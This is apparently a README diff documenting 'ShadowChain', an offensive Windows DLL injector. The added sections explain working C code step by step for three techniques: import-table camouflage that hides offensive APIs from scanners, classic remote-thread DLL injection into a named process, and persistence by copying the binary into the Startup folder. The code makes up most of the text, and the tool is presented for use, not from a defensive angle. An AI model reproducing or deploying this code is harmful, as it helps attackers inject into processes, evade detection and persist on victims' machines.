@@ -12,7 +12,11 @@ Shadow Chain is a DRM enabled dll injector with capabilities of Anti-debugging a
 
 # Explanation Of Working Of ShadowChain
 
-## Digital Rights Management
+## FlowChart Of ShadowChain
+
+
+
+## Digital Rights Management (DRM)
 -------
 The `IsSameMachine()` function in the `ShadowChain.c` file is responsible for implementing a Digital Rights Management (DRM) mechanism. This function ensures that the program runs only on the machine it was originally installed on by checking and patching the executable with the machine's volume serial number. Here is a detailed explanation of how the `IsSameMachine()` function works:
 
@@ -505,11 +509,294 @@ else {
 }
 ```
 
+## IAT Camoflague
+------
+The `IATCamoflage2` function is designed to add whitelisted APIs to camouflage the Import Address Table (IAT). This function allocates memory, performs some checks, and then calls various registry-related functions to obfuscate the IAT. This is essential to obfuscate "Offensive APIs" by importing a bunch of useless whitelisted APIs.
+
+### Detailed Steps
+
+1. **Allocate Memory**:
+- Allocates 256 bytes (`0x100`) of zero-initialized memory from the process heap.
+- If the allocation fails, the function returns immediately.
+```C
+ULONG_PTR uAddress = NULL;
+if (!(uAddress = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 0x100))) {
+	return;
+}
+```
+
+2. **Perform a Check on the Allocated Address**:
+- Shifts the allocated address right by 8 bits and masks it with `0xFF`.
+- If the result is greater than `0xFFFF`, it calls various registry-related functions with `NULL` parameters. This is done to obfuscate the IAT by adding these function calls to the import table.
+```C
+if (((uAddress >> 8) & 0xFF) > 0xFFFF) {
+	RegCloseKey(NULL);
+	RegDeleteKeyExA(NULL, NULL, NULL, NULL);
+	RegDeleteKeyExW(NULL, NULL, NULL, NULL);
+	RegEnumKeyExA(NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
+	RegEnumKeyExW(NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
+	RegEnumValueW(NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
+	RegEnumValueA(NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
+	RegGetValueA(NULL, NULL, NULL, NULL, NULL, NULL, NULL);
+	RegGetValueW(NULL, NULL, NULL, NULL, NULL, NULL, NULL);
+	RegisterServiceCtrlHandlerA(NULL, NULL);
+	RegisterServiceCtrlHandlerW(NULL, NULL);
+}
+```
+
+3. **Free the Allocated Memory**:
+- Frees the allocated memory.
+- If the memory cannot be freed, the function returns immediately.
+```C
+if (!HeapFree(GetProcessHeap(), 0x00, uAddress)) {
+	return;
+}
+```
+
+## Remote process Dll Injection
+-------
+The remote process Dll Injection takes place through two different functions. -
+
+### `GetRemoteProcessHandle` Function
+
+The `GetRemoteProcessHandle` function enumerates processes and gets the handle of a specified remote process. Here is a detailed explanation of how the function works:
+
+#### Parameters
+- `szProcessName`: The name of the process to find.
+- `dwProcessID`: A pointer to store the process ID of the found process.
+- `hProcess`: A pointer to store the handle of the found process.
+
+#### Detailed Steps
+
+1. **Initialize the Process Entry Structure**:
+   - Initializes a `PROCESSENTRY32` structure to store information about the processes.
+
+`PROCESSENTRY32 Proc = { .dwSize = sizeof(PROCESSENTRY32) };`
+
+2. **Initialize Variables**:
+- Initializes a variable for the snapshot handle.
+
+`HANDLE hSnapShot = NULL;`
+
+3. **Get the Snapshot of the Processes**:
+- Creates a snapshot of the processes using `CreateToolhelp32Snapshot`.
+- If the snapshot creation fails, prints an error message and jumps to the cleanup section.
+
+```C
+	hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+	if (hSnapShot == INVALID_HANDLE_VALUE) {
+		printf("[!] CreateToolhelp32Snapshot Failed With Error Code: %d\n", GetLastError());
+		goto _EndOfFunction;
+	}
+```
+
+4. **Read the First Process**:
+- Retrieves information about the first process in the snapshot using `Process32First`.
+- If the retrieval fails, prints an error message and jumps to the cleanup section.
+
+```C
+	if (!Process32First(hSnapShot, &Proc)) {
+		printf("[!] Process32First Failed With Error Code: %d\n", GetLastError());
+		goto _EndOfFunction;
+	}
+```
+
+5. **Read the Remaining Processes**:
+- Iterates through the remaining processes in the snapshot using `Process32Next`.
+- If the process name matches the specified process name, retrieves the process ID and opens a handle to the process using `OpenProcess`.
+- If the handle opening fails, prints an error message.
+
+```C
+	//Read The Remaining Processes
+	do {
+		// If the process name matches the required process name
+		if (wcscmp(Proc.szExeFile, szProcessName) == 0) {
+			// Get the process ID
+			*dwProcessID = Proc.th32ProcessID;
+			//Open a handle to the process
+			*hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, *dwProcessID);
+			if (*hProcess == NULL) {
+				printf("[!] OpenProcess Failed With Error Code: %d\n", GetLastError());
+			}
+			break;
+		}
+	} while (Process32Next(hSnapShot, &Proc));
+```
 
 
+6. **Cleanup and Return**:
+- Closes the snapshot handle and returns `TRUE` if the process was found and the handle was successfully opened, `FALSE` otherwise.
+
+```C
+_EndOfFunction:
+	if (hSnapShot != NULL)
+		CloseHandle(hSnapShot);
+	if (*dwProcessID == NULL || *hProcess == NULL)
+		return FALSE;
+	return TRUE;
+```
+
+### `InjectDllToRemoteProcess` Function
+
+The `InjectDllToRemoteProcess` function injects a DLL into a remote process. Here is a detailed explanation of how the function works:
+
+#### Parameters
+- `hProcess`: The handle of the remote process.
+- `DllName`: The name of the DLL to be injected.
+
+#### Detailed Steps
+
+1. **Initialize Variables**:
+- Initializes variables for the state, the address of `LoadLibraryW`, and the address in the remote process.
+```C
+	BOOL		bSTATE = TRUE;
+	LPVOID		pLoadLibraryW = NULL;
+	LPVOID		pAddress = NULL;
+```
+
+2. **Fetch the Size of the DLL Name**:
+- Calculates the size of the DLL name in bytes.
+```C
+	DWORD		dwSizeToWrite = lstrlenW(DllName) * sizeof(WCHAR);
+	SIZE_T		lpNumberOfBytesWritten = NULL;
+	HANDLE		hThread = NULL;
+```
+
+3. **Load `LoadLibraryW` Function**:
+- Retrieves the handle of `kernel32.dll` using `GetModuleHandle`.
+- If the handle retrieval fails, prints an error message and jumps to the cleanup section.
+- Retrieves the address of `LoadLibraryW` using `GetProcAddress`.
+- If the address retrieval fails, prints an error message and jumps to the cleanup section.
+```C
+	//Opening a handle to kernel32.dll
+    HMODULE hKernel32 = GetModuleHandle(L"kernel32.dll");
+    if (hKernel32 == NULL) {
+        printf("[!] GetModuleHandle Failed With Error Code: %d\n", GetLastError());
+        bSTATE = FALSE;
+        goto _EndOfFunction;
+    }
+
+	// Get the address of LoadLibraryW and loading it
+    pLoadLibraryW = GetProcAddress(hKernel32, "LoadLibraryW");
+    if (pLoadLibraryW == NULL) {
+        printf("[!] GetProcAddress Failed With Error Code: %d\n", GetLastError());
+        bSTATE = FALSE;
+        goto _EndOfFunction;
+    }
+```
+
+4. **Allocate Memory in the Remote Process**:
+- Allocates memory in the remote process using `VirtualAllocEx`.
+- If the memory allocation fails, prints an error message and jumps to the cleanup section.
+```C
+	pAddress = VirtualAllocEx(hProcess, NULL, dwSizeToWrite, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+	if (pAddress == NULL) {
+		printf("[!] VirtualAllocEx Failed With Error Code: %d\n", GetLastError());
+		bSTATE = FALSE;
+		goto _EndOfFunction;
+	}
+```
+
+5. **Write the DLL Name to the Allocated Memory**:
+- Writes the DLL name to the allocated memory in the remote process using `WriteProcessMemory`.
+- If the memory writing fails, prints an error message and jumps to the cleanup section.
+```C
+	if (!WriteProcessMemory(hProcess, pAddress, DllName, dwSizeToWrite, &lpNumberOfBytesWritten)) {
+		printf("[!] WriteProcessMemory Failed With Error Code: %d\n", GetLastError());
+		bSTATE = FALSE;
+		goto _EndOfFunction;
+	}
+```
+
+6. **Create a Remote Thread to Load the DLL**:
+- Creates a remote thread in the remote process to load the DLL using `CreateRemoteThread`.
+- If the thread creation fails, prints an error message and jumps to the cleanup section.
+```C
+	hThread = CreateRemoteThread(hProcess, NULL, NULL, pLoadLibraryW, pAddress, NULL, NULL);
+	if (hThread == NULL) {
+		printf("[!] CreateRemoteThread Failed With Error Code: %d\n", GetLastError());
+		bSTATE = FALSE;
+		goto _EndOfFunction;
+	}
+```
+
+7. **Cleanup and Return**:
+- Closes the thread handle and returns the state (`TRUE` if successful, `FALSE` otherwise).
+```C
+_EndOfFunction:
+	if (hThread) {
+		CloseHandle(hThread);
+	}
+	return bSTATE;
+```
+
+## Persistence Using Startup Folder
+--------
+
+The `MoveToStartup` function moves the current running binary to the startup folder to ensure it runs on system startup. Here is a detailed explanation of how the function works:
 
 
+### Detailed Steps
 
+1. **Initialize Variables**:
+- Initializes variables to store the paths of the startup folder, the current binary location, and the new path in the startup folder.
+```C
+    wchar_t szStartupPath[MAX_PATH];
+    wchar_t szCurrentPath[MAX_PATH];
+    wchar_t szNewPath[MAX_PATH];
+```
 
+2. **Get the Path of the Startup Folder**:
+- Retrieves the path of the startup folder using `SHGetFolderPath`.
+- If the retrieval fails, prints an error message and returns `FALSE`.
+```C
+    if (FAILED(SHGetFolderPath(NULL, CSIDL_STARTUP, NULL, 0, szStartupPath))) {
+        printf("[!] SHGetFolderPath Failed With Error Code: %d\n", GetLastError());
+        return FALSE;
+    }
+```
+
+3. **Get the Current Location of the Binary**:
+- Retrieves the current location of the binary using `GetModuleFileName`.
+- If the retrieval fails, prints an error message and returns `FALSE`.
+```C
+    DWORD length = GetModuleFileName(NULL, szCurrentPath, MAX_PATH);
+    if (length == 0) {
+        printf("[!] GetModuleFileName Failed With Error Code: %d\n", GetLastError());
+        return FALSE;
+    }
+```
+
+4. **Construct the New Path in the Startup Folder**:
+- Finds the last backslash in the current path to separate the directory from the executable name.
+- Constructs the new path in the startup folder by appending the executable name to the startup folder path using `StringCchPrintf`.
+- If the construction fails, prints an error message and returns `FALSE`.
+```C
+    wchar_t* lastSlash = wcsrchr(szCurrentPath, L'\\');
+    if (lastSlash != NULL) {
+        StringCchPrintf(szNewPath, MAX_PATH, L"%s%s", szStartupPath, lastSlash);
+    } else {
+        printf("[!] Failed to construct new path\n");
+        return FALSE;
+    }
+```
+
+5. **Copy the Binary to the Startup Folder**:
+- Copies the binary to the startup folder using `CopyFile`.
+- If the copy operation fails, prints an error message and returns `FALSE`.
+```C
+    if (!CopyFile(szCurrentPath, szNewPath, FALSE)) {
+        printf("[!] CopyFile Failed With Error Code: %d\n", GetLastError());
+        return FALSE;
+    }
+```
+
+6. **Print Success Message and Return**
+- Prints a success message indicating that the binary was successfully moved to the startup folder.
+- Returns `TRUE`.
+```C
+    printf("[+] Successfully moved the binary to the startup folder\n");
+    return TRUE;
+```
 
 
